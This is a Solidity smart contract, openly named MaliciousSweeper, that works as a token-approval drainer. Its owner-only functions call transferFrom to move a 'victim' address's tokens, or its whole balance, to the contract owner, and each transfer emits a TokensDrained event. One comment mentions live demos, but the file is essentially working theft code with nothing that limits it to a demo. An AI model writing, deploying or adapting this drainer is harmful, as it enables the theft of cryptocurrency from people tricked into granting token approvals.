// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousSweeper {
    address public owner;

    // Event for easy tracking on Etherscan
    event TokensDrained(address indexed token, address indexed victim, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    // Drain a specific amount
    function sweepTokens(address tokenAddress, address victimAddress, uint256 amount) external onlyOwner {
        IToken(tokenAddress).transferFrom(victimAddress, owner, amount);
        emit TokensDrained(tokenAddress, victimAddress, amount);
    }

    // Drain the victim's ENTIRE balance (Better for live demos)
    function sweepAll(address tokenAddress, address victimAddress) external onlyOwner {
        uint256 balance = IToken(tokenAddress).balanceOf(victimAddress);
        require(balance > 0, "No balance to sweep");
        IToken(tokenAddress).transferFrom(victimAddress, owner, balance);
        emit TokensDrained(tokenAddress, victimAddress, balance);
    }
}